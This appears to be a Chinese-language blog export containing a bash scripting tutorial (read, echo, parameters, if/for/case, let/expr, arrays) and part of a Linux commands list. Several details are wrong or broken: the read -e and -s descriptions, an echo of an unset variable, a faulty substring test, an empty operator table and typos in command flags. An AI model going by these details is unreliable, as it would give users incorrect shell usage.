<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-a 	 name 	 把词读入到name数组中去。</span><br><span class="line">-e  		把一整行读入到第一个变量中，其余的变量均为null。</span><br><span class="line">-n			在输出echo后的字符串后，光标仍然停留在同一行。</span><br><span class="line">-p   prompt   如果是从终端读入数据则显示prompt字符串。</span><br></pre></td></tr></table></figure>
</li>
<li><p>读入的一行输入由许多词组成，他们是用空格（或者制表符，或shell环境变量IFS的值）分隔开的。 </p>
</li>
<li><p>如果这些词的数量比列出的变量的数量多，则把余下的所有词赋值给最后一个变量。如果列出的变量的数量多于输入的词的数量，这多余的变量的值被设置为null。 </p>
</li>
<li><p>通常情况下，在用户按下回车键时，read命令结束。</p>
</li>
</ul>
<h3 id="read实例"><a href="#read实例" class="headerlink" title="read实例"></a>read实例</h3><h4 id="使用echo-n："><a href="#使用echo-n：" class="headerlink" title="使用echo -n："></a>使用<code>echo -n</code>：</h4><ul>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo -n "input:"   #参数-n的作用是不换行，echo默认是换行</span><br><span class="line">read  name         #从键盘输入</span><br><span class="line">echo $name     	   #显示信息</span><br><span class="line">exit 0    		   #退出shell程序。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="read-p"><a href="#read-p" class="headerlink" title="read -p"></a>read -p</h4><ul>
<li><p>由于read命令提供了-p参数，允许在read命令行中直接指定一个提示。故上面的脚本可以简写成下面的脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read -p "Enter your name:" name</span><br><span class="line">echo "hello $name, welcome to my program"</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>在read命令行中也可以不指定变量.如果不指定变量，那么read命令会将接收到的数据放置在环境变量REPLY中。</p>
<ul>
<li>如<code>read -p &quot;Enter a number&quot;</code></li>
<li>环境变量REPLY中包含输入的所有数据，可以像使用其他变量一样在shell脚本中使用环境变量REPLY.</li>
</ul>
</li>
</ul>
<h4 id="计时输入"><a href="#计时输入" class="headerlink" title="计时输入"></a>计时输入</h4><ul>
<li><p>使用read命令存在着潜在危险。脚本很可能会停下来一直等待用户的输入。</p>
</li>
<li><p>如果无论是否输入数据脚本都必须继续执行，那么可以使用-t选项指定一个计时器。</p>
</li>
<li><p>-t选项指定read命令等待输入的秒数。当计时满时，read命令返回一个非零退出状态;</p>
</li>
<li><p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if read -t 5 -p "please enter your name:" name</span><br><span class="line">then </span><br><span class="line">    echo "hello $name ,welcome to my script"</span><br><span class="line">else</span><br><span class="line">    echo "sorry,too slow"</span><br><span class="line">fi</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="限制输入字符"><a href="#限制输入字符" class="headerlink" title="限制输入字符"></a>限制输入字符</h4><ul>
<li><p>除了输入时间计时，还可以设置read命令计数输入的字符。</p>
</li>
<li><p>当输入的字符数目达到预定数目时，自动退出，并将输入的数据赋值给变量。</p>
</li>
<li><p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read –n 1 -p "Do you want to continue [Y/N]?" answer</span><br><span class="line">case $answer in</span><br><span class="line">Y | y)</span><br><span class="line">      echo "fine ,continue";;</span><br><span class="line">N | n)</span><br><span class="line">      echo "ok,good bye";;</span><br><span class="line">*)</span><br><span class="line">     echo "error choice";;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
<ul>
<li>该例子使用了-n选项，后接数值1，指示read命令只要接受到一个字符就退出。</li>
<li>只要按下一个字符进行回答，read命令立即接受输入并将其传给变量。无需按回车键。</li>
</ul>
</li>
</ul>
<h4 id="默读（输入不显示）"><a href="#默读（输入不显示）" class="headerlink" title="默读（输入不显示）"></a>默读（输入不显示）</h4><ul>
<li><p>输入的数据不显示，如Linux系统输入密码时不显示</p>
</li>
<li><p>-s选项能够使read命令中输入的数据不显示在监视器上</p>
</li>
<li><p>实际上，数据是显示的，只是 read命令将文本颜色设置成与背景相同的颜色）</p>
</li>
<li><p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read  -s  -p "Enter your password:" pass</span><br><span class="line">echo "your password is $pass"</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="read读取Linux系统文件"><a href="#read读取Linux系统文件" class="headerlink" title="read读取Linux系统文件"></a>read读取Linux系统文件</h4><ul>
<li><p>每次调用read命令都会读取文件中的”一行”文本。当文件没有可读的行时，read命令将以非零状态退出。</p>
</li>
<li><p>读取文件的关键是如何将文本中的数据传送给read命令。</p>
</li>
<li><p>最常用的方法是对文件使用cat命令并通过管道将结果直接传送给包含read命令的 while命令</p>
</li>
<li><p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">count=1    #赋值语句，不加空格</span><br><span class="line">cat test | while read line        #cat 命令的输出作为read命令的输入,read读到的值放在line中</span><br><span class="line">do</span><br><span class="line">   echo "Line $count:$line"</span><br><span class="line">   count=$[ $count + 1 ]          #注意中括号中的空格。</span><br><span class="line">done</span><br><span class="line">echo "finish"</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="输出命令"><a href="#输出命令" class="headerlink" title="输出命令"></a>输出命令</h2><ul>
<li><p>echo命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。</p>
</li>
<li><p>该命令的一般格式为：<code>echo [-ne][字符串]或 echo [--help][--version]</code></p>
<ul>
<li>echo会将输入的字符串送往标准输出。</li>
<li>输出的字符串间以空白字符隔开</li>
<li>默认自动换行。（-n参数可避免换行）</li>
</ul>
</li>
<li><p>参数：-n 不要在最后自动换行</p>
</li>
<li><p>-e 若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\a 		发出警告声；</span><br><span class="line">\b 		删除前一个字符；</span><br><span class="line">\c 		最后不加上换行符号；</span><br><span class="line">\f 		换行但光标仍旧停留在原来的位置；</span><br><span class="line">\n 		换行且光标移至行首；</span><br><span class="line">\r 		光标移至行首，但不换行；</span><br><span class="line">\t 		插入tab；</span><br><span class="line">\v 		与\f相同；</span><br><span class="line">\\ 		插入\字符；</span><br><span class="line">\nnn 	插入nnn（八进制）所代表的ASCII字符</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="shell脚本位置参数"><a href="#shell脚本位置参数" class="headerlink" title="shell脚本位置参数"></a>shell脚本位置参数</h1><h2 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h2><ul>
<li><p>在Linux系统中运行命令或脚本程序时，可以在命令行中进行参数的传递。</p>
</li>
<li><p>如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">*  <span class="variable">$@</span>  <span class="variable">$#</span>  <span class="variable">$n</span>  $?  $$  $!</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>$* 和$@</code>有区别：</p>
<ul>
<li><code>$@ $*</code> 只在被双引号包起来的时候才会有差异双引号括起来的情况：</li>
<li><code>$*</code>将所有的参数认为是一个字段</li>
<li><code>$@</code>以IFS（默认为空格）来划分字段</li>
</ul>
</li>
<li><p>一图胜千言：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-4/89186367.jpg" alt></p>
</li>
<li><p>实例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line">echo “程序名: $0”</span><br><span class="line">echo “命令传递参数个数:$#”</span><br><span class="line">echo “参数值分别是:$1 $2 $3 $4 $5 $6 $7 $8 $9”</span><br><span class="line">echo “所有参数: $@”</span><br><span class="line">exit 0</span><br><span class="line">[root@localhost root]# demo_arg a b c d e f g h i </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">程序名:demo_arg</span></span><br><span class="line"><span class="meta">#</span><span class="bash">命令传递参数个数: 9</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数值分别是: a b c d e f g h i</span></span><br><span class="line"><span class="meta">#</span><span class="bash">所有参数: a b c d e f g h i</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="shift命令"><a href="#shift命令" class="headerlink" title="shift命令"></a>shift命令</h2><ul>
<li><p>当有脚本程序的参数多于9个时，用shift命令来使用多于9个的参数。</p>
</li>
<li><p>命令句法：shift [N]</p>
</li>
<li><p>功能：把命令行参数向左移动N个位置</p>
</li>
<li><p>实例：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-4/23229533.jpg" alt></p>
</li>
</ul>
<h2 id="set命令"><a href="#set命令" class="headerlink" title="set命令"></a>set命令</h2><ul>
<li><p>命令语法：<code>set [options] argnument-list</code></p>
</li>
<li><p>功能：设置标志、选项和位置参数；使用在argument-list中的值来设置位置参数。</p>
</li>
<li><p>常用选项：</p>
<pre><code>--      不把以’-’开头的词作为参数选项
</code></pre></li>
<li><p>实例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# cat demo_set</span><br><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line">filename=“$1”</span><br><span class="line">set $(ls –il $filename)</span><br><span class="line">inode=“$1”</span><br><span class="line">size=“$6”</span><br><span class="line">echo “Name 	Inode  Size”</span><br><span class="line">echo “$filename 	$inode 	$size”</span><br><span class="line">exit 0</span><br><span class="line"></span><br><span class="line">[root@localhost root]# demo_set file0</span><br><span class="line">Name 	Inode  Size</span><br><span class="line">file0  	980  	282</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="控制结构语句"><a href="#控制结构语句" class="headerlink" title="控制结构语句"></a>控制结构语句</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><ul>
<li>bash具有一般高级程序设计语言具有的控制结构语句。</li>
<li>程序控制语句是用来决定shell脚本执行时各个语句执行的顺序的。</li>
<li>有三种基本命令可以控制程序流程：<ul>
<li>二路跳转（if语句）</li>
<li>多路跳转（case和if语句）</li>
<li>循环结构（for、while和until语句）</li>
</ul>
</li>
</ul>
<h2 id="if-then-elif-else-fi语句"><a href="#if-then-elif-else-fi语句" class="headerlink" title="if-then-elif-else-fi语句"></a>if-then-elif-else-fi语句</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><ul>
<li><p>格式如下：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-5/26378751.jpg" alt></p>
</li>
</ul>
<ul>
<li>Linux里的if的结束标志是将if反过来写成fi；而elif其实是else if的缩写，其中elif理论上可以有无限多个。<ul>
<li>表达式expression可以用test expression命令或[ expression ]来检测。这个命令检测一个表达式并返回true还是false。</li>
<li>命令语法：<code>test [expression]</code>和<code>[ expression ]</code></li>
<li>test命令可以使用的条件类型可以归为三类：字符串比较、算术比较和与文件有关的条件测试 。</li>
</ul>
</li>
</ul>
<h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><ul>
<li><p>作用：测试字符串是否相等、长度是否为零，字符串是否为NULL。</p>
</li>
<li><p>常用的字符串操作符：</p>
<p>| 字符串操作符 | 含义及返回值                        |<br>| ———— | ———————————– |<br>| =            | 比较两字符串是否相同，              |<br>| !=           | 比较两字符串是否不相同，            |<br>| -n           | 比较字符串长度是否等于0，           |<br>| -z           | 比较字符串长度是否等于0，若是则返真 |</p>
</li>
</ul>
<h3 id="算术比较"><a href="#算术比较" class="headerlink" title="算术比较"></a>算术比较</h3><ul>
<li><p>在bash shell编程中的关系运算有别于其他编程语言。</p>
</li>
<li><p>| 运算符号 | 含义     |<br>| :——- | :——- |<br>| -eq      | 相等     |<br>| -ge      | 大于等于 |<br>| -le      | 小于等于 |<br>| -ne      | 不等于   |<br>| -gt      | 大于     |<br>| -lt      | 小于     |</p>
</li>
</ul>
<h3 id="逻辑操作"><a href="#逻辑操作" class="headerlink" title="逻辑操作"></a>逻辑操作</h3><ul>
<li><p>逻辑运算符号：</p>
<p>| 运算符号 | 含义 |<br>| ——– | —- |<br>| -d       |      |<br>| -f       |      |<br>| -L       |      |<br>| -r       |      |<br>| -s       |      |<br>| -w       |      |<br>| -x       |      |</p>
</li>
</ul>
<h3 id="文件条件测试"><a href="#文件条件测试" class="headerlink" title="文件条件测试"></a>文件条件测试</h3><ul>
<li><p>文件测试表达式通常是为了测试文件的信息，一般由脚本来决定文件是否应该备份、复制或删除</p>
</li>
<li><p>常用：</p>
<p>| 运算符号 | 含义                           |<br>| ——– | —————————— |<br>| -d       | 若文件对象存在且为目录，返回真 |<br>| -f       | ……且为普通文件……               |<br>| -L       | ……且为链接为文件……             |<br>| -r       | ……且可读……                     |<br>| -s       | ……且长度非0……                  |<br>| -w       | ……且可写……                     |<br>| -x       | ……且可执行……                   |</p>
</li>
</ul>
<h2 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h2><ul>
<li><p>例： 在列表中的值：a,b,c,e,i,2,4,6,8用循环的方式把字符与数字分成两行输出。</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">for i in a,b,c,e,i   2,4,6,8</span><br><span class="line"> do </span><br><span class="line">  echo $i</span><br><span class="line"> done</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">结果</span></span><br><span class="line">[root@localhost bin]# ./test9</span><br><span class="line">a,b,c,e,i</span><br><span class="line">2,4,6,8</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：在循环列表中的空格可表示换行</li>
</ul>
</li>
<li><p>例:求从1到100的和。</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">total=0</span><br><span class="line">for ((j=1;j&lt;=100;j++));</span><br><span class="line">  do</span><br><span class="line">     total=`expr $total + $j`</span><br><span class="line">  done</span><br><span class="line">echo "The result is $total"</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：for语句中的双括号不能省，最后的分号可有可无，表达式total=<code>expr $total + $j</code>的加号两边的空格不能省，否则会成为字符串的连接</li>
</ul>
</li>
</ul>
<h2 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h2><ul>
<li><p>语法：</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">while 表达式</span><br><span class="line">  do</span><br><span class="line">    操作</span><br><span class="line">  done</span><br></pre></td></tr></table></figure>
</li>
<li><p>只要while表达式为真，do和done之间的操作就一直会进行</p>
</li>
</ul>
<h2 id="util语句"><a href="#util语句" class="headerlink" title="util语句"></a>util语句</h2><ul>
<li><p>语法：</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">until 表达式</span><br><span class="line">	do</span><br><span class="line">		操作</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
</li>
<li><p>重复do和done之间的操作直到表达式成立为止。</p>
</li>
</ul>
<h2 id="case语句"><a href="#case语句" class="headerlink" title="case语句"></a>case语句</h2><ul>
<li><p>语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case 字符串 in</span><br><span class="line">值1|值2)  操作</span><br><span class="line">    ;;</span><br><span class="line">值3|值4)  操作</span><br><span class="line">    ;;</span><br><span class="line">…</span><br><span class="line">值5|值6)   操作</span><br><span class="line">   ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
</li>
<li><p>case的作用就是当字符串与某个值相同是就执行那个值后面的操作。如果同一个操作对于多个值，则使用“|”将各个值分开。</p>
</li>
<li><p>在case的每一个操作的最后面都有两个”;;”，分号是必须的。</p>
</li>
<li><p>例：Linux是一个多用户操作系统，编写一程序根据不同的用户登录输出不同的反馈结果。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost bin]#vi test15</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">case $USER in</span><br><span class="line"> beichen)</span><br><span class="line">   echo "You are beichen!";;</span><br><span class="line"> liangnian)</span><br><span class="line">   echo "You are liangnian"; //注意这里只有一个分号 </span><br><span class="line">   echo "Welcome!";;  //这里才是两个分号</span><br><span class="line"> root)</span><br><span class="line">   echo "You are root! "; echo "Welcome!";;</span><br><span class="line">    //将两命令写在一行，用一个分号作为分隔符 </span><br><span class="line"> *)</span><br><span class="line">   echo "Who are you?$USER?";;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="break和continue语句"><a href="#break和continue语句" class="headerlink" title="break和continue语句"></a>break和continue语句</h2><ul>
<li>break命令使得程序跳出for、while、until循环，执行done后面的语句，这样就永久终止了循环。</li>
<li>continue命令使得程序跳到done，这使得循环条件被再次求值，从而开始新的一次循环，循环变量取循环列表中的下一个值。</li>
<li>无论哪种情况，循环体中在这两条命令后的语句都没有执行。</li>
<li>break命令和continue命令常作为条件语句的一部分来使用</li>
</ul>
<h2 id="exit语句"><a href="#exit语句" class="headerlink" title="exit语句"></a>exit语句</h2><ul>
<li><p>exit命令使脚本程序结束运行，退出码为n</p>
</li>
<li><p>语句语法：exit n</p>
</li>
<li><p>在任何一个交互式shell的命令提示符中使用这个命令，它都会让你退出系统。</p>
</li>
<li><p>如果在退出时不指定一个退出状态，那么该脚本中最后一条被执行命令的状态将被用作返回值。</p>
</li>
<li><p>在shell脚本编程中，退出码0表示成功，退出码1~125是脚本程序使用的错误代码。其余数字具有保留含义 </p>
</li>
<li><p>| 退出码    | 说明         |<br>| ——— | ———— |<br>| 126       | 文件不可执行 |<br>| 127       | 命令未找到   |<br>| 128及以上 | 出现一个信号 |</p>
</li>
</ul>
<h2 id="printf语句"><a href="#printf语句" class="headerlink" title="printf语句"></a>printf语句</h2><ul>
<li>X/Open规范建议应该用它来代替echo命令以产生格式化的输出。</li>
<li><p>语句语法：</p>
<p>printf  “format string” parameter1 parameter2 …</p>
</li>
<li><p>格式字符串与C/C++中使用的非常相似，但有一些自己的限制。主要是不支持浮点数。</p>
</li>
<li>格式字符串由各种可打印字符、转义序列和字符转换限定符组成。</li>
<li>格式字符串中除了%和\之外的所有字符都将按原样输出。</li>
</ul>
<h1 id="数值处理"><a href="#数值处理" class="headerlink" title="数值处理"></a>数值处理</h1><h2 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h2><ul>
<li><p>在Linux系统中bash变量的值是以字符串方式存储。如果需要进行算术和逻辑操作，必须先转换为整数，得到运算结果后再转换回字符串，以便正确地保存于shell变量中。</p>
</li>
<li><p>bash提供了三种方法对数值数据进行算术运算：</p>
<p>(1) let命令    </p>
<p>(2) shell扩展$(( expression ))</p>
<p>(3) expr命令</p>
</li>
<li><p>以0为首的数字当作八进制数，以0x或0X为首的数字当作是十六进制数，除此之外则当作十进制数。</p>
</li>
<li><p>表达式求值以长整数进行，并且不作溢出检查。当在表达式中使用shell变量时，变量在求值前首先将被扩展和强制转换为长类型。</p>
</li>
<li><p>同组的运算符有相同的优先级。将表达式置于括号中可改变求值的次序</p>
</li>
</ul>
<h2 id="let命令"><a href="#let命令" class="headerlink" title="let命令"></a>let命令</h2><ul>
<li><p>let可以用来计算算术表达式的值。如果表达式中有空格或者特殊字符，则应将表达式括在双引号中。</p>
</li>
<li><p>命令语法：let express-list</p>
</li>
<li><p>如果最后的表达式取值为0，let命令返回1；否则返回0。</p>
</li>
<li><p>例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# let “x=6” “y = 9”“z = 16”</span><br><span class="line">[root@localhost root]# let t=x+y</span><br><span class="line">[root@localhost root]# echo “t= $t”</span><br><span class="line">t= 15</span><br><span class="line">[root@localhost root]# let A=2**x B=y*z </span><br><span class="line">[root@localhost root]# echo “A=$A    B=$B”</span><br><span class="line">A=64     B=144</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="exp-扩展"><a href="#exp-扩展" class="headerlink" title="$((exp))扩展"></a>$((exp))扩展</h2><ul>
<li><p>命令语法：$((expression))</p>
</li>
<li><p>shell计算expression并用其计算结果代替$((expression))。这个语法类似于命令替换所用的语法“$(…)”，并将执行相同的功能。可将$((expression))作为参数传递给命令或者放置在命令行上任何数字位置上。 </p>
</li>
<li><p>不需要在expression中的变量名称前加上$符号。</p>
</li>
<li><p>例2.15 age_check程序 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash </span></span><br><span class="line">echo -n "How old are you? " </span><br><span class="line">read age </span><br><span class="line">echo "Wow, in $((100-age)) years, you'll be 100! " </span><br><span class="line">[root@localhost root]# age_check </span><br><span class="line">How old are you? 20</span><br><span class="line">Wow, in 80 years, you'll be 100!</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="expr命令"><a href="#expr命令" class="headerlink" title="expr命令"></a>expr命令</h2><ul>
<li><p>expr命令将它的参数当作一个表达式来求值</p>
</li>
<li><p>命令语法：expr args</p>
</li>
<li><p>功能：计算表达式的参数‘args’的值，并返回它的值到标准输出。</p>
</li>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">常见用法：x=expr $x + 1</span><br><span class="line">反引号（）字符使x取值为命令expr $x + 1的执行结果。也可以用语法$()替换反引号</span><br></pre></td></tr></table></figure>
</li>
<li><p>expr命令的应用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# a1=5</span><br><span class="line">[root@localhost root]# a1=$( expr $a1 + 1 )</span><br><span class="line">[root@localhost root]# echo $var1</span><br><span class="line">6</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><ul>
<li><p>如何获取子字符串？如 str=“2013134.key”   获取去掉”.key”的字符串</p>
<ol>
<li>获取子字符串的位置</li>
<li>根据返回值，对字符串str进行截取</li>
</ol>
</li>
<li><p>获取子字符串的位置，如 str=“2013134.key”获取“key”的位置</p>
<ul>
<li>方法1：<code>$expr match $str “.*key”</code>（返回11）</li>
<li>方法2： <code>$expr index $str “key”</code>(返回9）</li>
<li>如果只是判断“key”是否在str中出现，可以这样写：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [[  $str == key ]]</span><br><span class="line">	then</span><br><span class="line">   		echo “yes,key is in str”</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据返回值，对字符串str进行截取。如 str=“2013134.key”已经获取“.”的位置是第8个，现在要截取str的前7个字符，作为子字符串</p>
<ul>
<li><p>方法1：<code>echo  ${str:0:7}</code>//从第0个字符开始截取，截取7个字符</p>
</li>
<li><p>方法2：<code>$expr substr &quot;$variable&quot; startposition length</code></p>
<p>   <code>$expr substr $str 1 7</code></p>
</li>
</ul>
</li>
</ul>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="数组声明"><a href="#数组声明" class="headerlink" title="数组声明"></a>数组声明</h2><ul>
<li><p>可以使用declare、local、readonly等各种语句声明数组变量，也可以直接赋值的方法声明一个数组。</p>
</li>
<li><p>常用格式：<code>name=(value1 ... valueN)</code></p>
<ul>
<li>value1形如“[[subscript]=]string”。</li>
</ul>
</li>
</ul>
<ul>
<li>下标是可选的，若给出，则给数组中相应的位置赋值；否则将给数组中上次赋值位置的下一个位置赋值 </li>
</ul>
<ul>
<li><p>例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# ns=(max san [6]=zhang [25]=wang)</span><br><span class="line">[root@localhost root]# echo $&#123;ns[0]&#125;</span><br><span class="line">max</span><br><span class="line">[root@localhost root]# echo $&#123;ns[6]&#125;</span><br><span class="line">zhang</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="数组元素的引用（即访问）"><a href="#数组元素的引用（即访问）" class="headerlink" title="数组元素的引用（即访问）"></a>数组元素的引用（即访问）</h2><ul>
<li><p>可以用<code>${name[subscript]}</code>引用数组中的元素。这种方式叫数组索引</p>
</li>
<li><p>下标<code>[@]与[*]</code>的作用都是得到整个数组元素，但它们加上双引号使用时是不同的。</p>
</li>
<li><p><code>“${name[@]}”</code>含义将原数组的内容复制到一个新数组中，生成的新数组和原来一样；</p>
</li>
<li><p><code>“${name[*]}”</code>把原数组中的所有元素当成一个元素复制到新数组中，生成新的数组只有一个元素。</p>
</li>
<li><p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost root]# a=(“$&#123;ns[@]&#125;”)</span><br><span class="line">[root@localhost root]# echo $&#123;a[0]&#125;</span><br><span class="line">max</span><br><span class="line">[root@localhost root]# b=(“$&#123;ns[*]&#125;”)</span><br><span class="line">[root@localhost root]# echo $&#123;b[0]&#125;</span><br><span class="line">max san zhang wang</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：给数组赋值时，等号右边要使用圆括号。 </li>
</ul>
</li>
</ul>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><ul>
<li><p>shell程序也支持函数。函数能完成一个特定的功能，可以重复调用这个函数。</p>
</li>
<li><p>格式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">函数名（   ）</span><br><span class="line">&#123;</span><br><span class="line">   函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>函数调用方式为：<code>函数名  参数列表</code></p>
</li>
<li><p>可以使用local关键字在shell函数中声明局部变量，局部变量将局限在函数的作用范围内。 </p>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-Linux常用命令</title>
    <url>/2017/12/25/etc/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><ul>
<li>write命令<ul>
<li>write+用户名</li>
<li>给在线用户发信息，ctrl+d保存结束</li>
<li>前提是通信双方登录到同一主机</li>
<li>w查看当前系统在线用户<a id="more"></a></li>
</ul>
</li>
<li>wall命令<ul>
<li>wall+待发送消息</li>
<li>发广播信息</li>
<li>目标是当前在线所有用户（包括发信者本身也会收到</li>
</ul>
</li>
<li>ping命令<ul>
<li>格式：ping +选项+IP地址<ul>
<li>不加：无限次发送ping包</li>
<li>c参数：指定发送次数</li>
</ul>
</li>
<li>功能：测试网络连通性</li>
<li>输出结果关注丢包率是否高</li>
</ul>
</li>
<li>ifconfig命令<ul>
<li>ifconfig+网卡名称+IP地址<ul>
<li>直接ifconfig显示所有网卡信息（最常用</li>
</ul>
</li>
<li>查看和设置网卡信息（常用来看本机IP</li>
</ul>
</li>
<li>mail命令<ul>
<li>mail：查看邮件<ul>
<li>进入交互界面</li>
<li>直接id号，查看相应邮件</li>
</ul>
</li>
<li>mail+用户名：给xxx发邮件<ul>
<li>ctrl+d结束输入并发送</li>
</ul>
</li>
<li>针对于当前系统的用户，非163等邮件发送</li>
<li>比write高级，目标用户不在线时也可发送，待其上线后提示</li>
</ul>
</li>
<li>last命令<ul>
<li>直接last</li>
<li>列出目前与过去登录系统的用户信息</li>
<li>也会显示系统何时重启，是重要的日志记录</li>
</ul>
</li>
<li>lastlog命令<ul>
<li>last  -u + UID<ul>
<li>不加选项，显示所有用户</li>
</ul>
</li>
<li>检查某特定用户上次登录的时间</li>
</ul>
</li>
<li>traceroute命令<ul>
<li>traceroute + 主机域名</li>
<li>显示数据包到主机间的路径，即追踪路由</li>
</ul>
</li>
<li>netstat命令<ul>
<li>netstat+选项<ul>
<li>常用选项<ul>
<li>t：tcp协议</li>
<li>u：udp协议</li>
<li>l：监听</li>
<li>r：路由</li>
<li>n：显示IP地址和端口号</li>
</ul>
</li>
<li>例如<ul>
<li>netstat -tuln：查看本机监听端口</li>
<li>netstat -an：查看本机所有网络连接（与tuln不同，可查看正在连接的网络程序</li>
<li>netstat -pantu（kali教程中</li>
<li>netstat -rn：查看本机路由表（可查看网关</li>
</ul>
</li>
</ul>
</li>
<li>显示网络相关信息</li>
</ul>
</li>
<li>setup命令<ul>
<li>直接setup即可</li>
<li>配置网络</li>
<li>redhat系列专有</li>
</ul>
</li>
</ul>
<h2 id="关机重启命令"><a href="#关机重启命令" class="headerlink" title="关机重启命令"></a>关机重启命令</h2><ul>
<li>shutdown命令<ul>
<li>shutdown+选项+时间<ul>
<li>c：取消前一个关机命令</li>
<li>h：关机</li>
<li>r：重启</li>
</ul>
</li>
<li>举例<ul>
<li>shutdown -h now：立即关机</li>
<li>shutdown -h 20:30 指定具体时间关机</li>
<li>shutdown -吃：取消上一关机指令</li>
<li>同样r重启也可以立刻或指定具体时间</li>
</ul>
</li>
<li>关机或重启前，尽量关闭其它服务（尤其是服务器，硬盘等处于高速运转过程，贸然操作可能出错</li>
<li>其它<ul>
<li>其它关机命令：halt、poweroff、init 0</li>
<li>其它重启命令：reboot、init 6</li>
